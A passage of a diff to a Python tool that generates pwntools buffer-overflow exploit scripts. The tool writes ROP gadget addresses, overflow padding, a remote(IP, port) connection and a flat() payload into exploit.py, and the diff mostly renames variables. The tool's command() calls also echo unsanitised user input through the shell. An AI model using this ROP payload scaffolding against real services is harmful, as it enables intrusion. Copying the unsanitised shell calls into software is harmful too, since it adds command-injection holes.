             for x in range (0, maxDispl):
-               GADD[x] = gadgets.readline().rstrip(" ")
-               GADD[x] = spacePadding(GADD[x], COL3)
+               GRAD[x] = gadgets.readline().rstrip(" ")
+               GRAD[x] = spacePadding(GRAD[x], COL3)
                if x == 0:
-                  RDI = GADD[x].split(" ")[0].rstrip(" ")
+                  RDI = GRAD[x].split(" ")[0].rstrip(" ")
          command("mv gadgets.tmp " + localDir + "/gadgets.txt")
       prompt()
    
@@ -1553,12 +1577,15 @@ while True:
 # -------------------------------------------------------------------------------------      
       
    if selection =='36':
-      BAK = OFF
-      OFF = input("[?] Please enter offset value: ")
-      if OFF != "":
-         OFF = OFF + " Bytes"
-         OFF = spacePadding(OFF,COL1)
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
       else:
+         BAK = OFF
+         OFF = input("[?] Please enter offset value: ")
+         if OFF != "":
+            OFF = OFF + " Bytes"
+            OFF = spacePadding(OFF,COL1)
+         else:
             OFF = BAK
       prompt() 
       
@@ -1574,13 +1601,13 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         BAK = OFF2
-         OFF2 = input("[?] Please enter offset value: ")
-         if OFF2 != "":
-            OFF2 = OFF2 + " Bytes"
-            OFF2 = spacePadding(OFF2,COL1)
+         BAK = OF2
+         OF2 = input("[?] Please enter offset value: ")
+         if OF2 != "":
+            OF2 = OF2 + " Bytes"
+            OF2 = spacePadding(OF2,COL1)
          else:
-            OFF2 = BAK
+            OF2 = BAK
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -1732,10 +1759,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      remAddr = input("[?] Please enter remote IP address : ")
-      remAddr = spacePadding(remAddr, COL1)
-      remPort = input("[?] Please enter remote port number: ")
-      remPort = spacePadding(remPort, COL1)
+      RAD = input("[?] Please enter remote IP address : ")
+      RAD = spacePadding(RAD, COL1)
+      POR = input("[?] Please enter remote port number: ")
+      POR = spacePadding(POR, COL1)
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -1769,22 +1796,22 @@ while True:
          else:
             command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
          command("echo '#context.arch = \"" + ARC.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
-         command("echo '#context.bits = \"" + BITS[:2] + "\"' >> " + localDir + "/exploit.py")
+         command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'try:' >> " + localDir + "/exploit.py")
-         if remAddr[:7] == "unknown":
+         if RAD[:7] == "unknown":
             command("echo '   s = remote(\"0\",0)' >> " + localDir + "/exploit.py")
          else:
-            command("echo '   s = remote(\"" + remAddr.rstrip(" ") + "\", " + remPort.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo '   s = remote(\"" + RAD.rstrip(" ") + "\", " + POR.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'except:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")        
          command("echo 'RAX = p64(" + RAX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RBX = p64(" + RBX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RCX = p64(" + RCX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'SYS = p64(" + SYS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RDX = p64(" + RDX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RSI = p64(" + RSI.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'CUS = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RDI = p64(" + RDI.rstrip(" ") + ") # pop rdi ; ret' >> " + localDir + "/exploit.py")
          command("echo 'RSP = p64(" + RSP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RBP = p64(" + RBP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
@@ -1793,20 +1820,20 @@ while True:
          command("echo 'start = p64(" + SRT.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'main  = p64(" + MAN.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'jump  = p64(" + JMP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'write = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'write = p64(" + TST.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
-         if OFF2[:1] == "0":
+         if OF2[:1] == "0":
             command("echo 'offset = " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
          else:
-            command("echo 'offset = " + OFF2.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")         
+            command("echo 'offset = " + OF2.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")         
          command("echo 'padding = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
          if JMP.rstrip(" ") != "0x0000000000000000":
             switch = 1           
-         if CUS.rstrip(" ") != "0x0000000000000000":
+         if TST.rstrip(" ") != "0x0000000000000000":
             switch = 2  
-         if RSI.rstrip(" ") != "0x0000000000000000":
+         if CUS.rstrip(" ") != "0x0000000000000000":
             switch = 3         
          command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")                    
@@ -1819,7 +1846,7 @@ while True:
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")           
          command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
-         command("echo '   payload = flat(padding,RDI,RSI,RCX,terminate)' >> "  + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,RDI,CUS,SYS,terminate)' >> "  + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py") 
          command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
          command("echo '   s.sendline(\"hof\")' >> " + localDir + "/exploit.py")
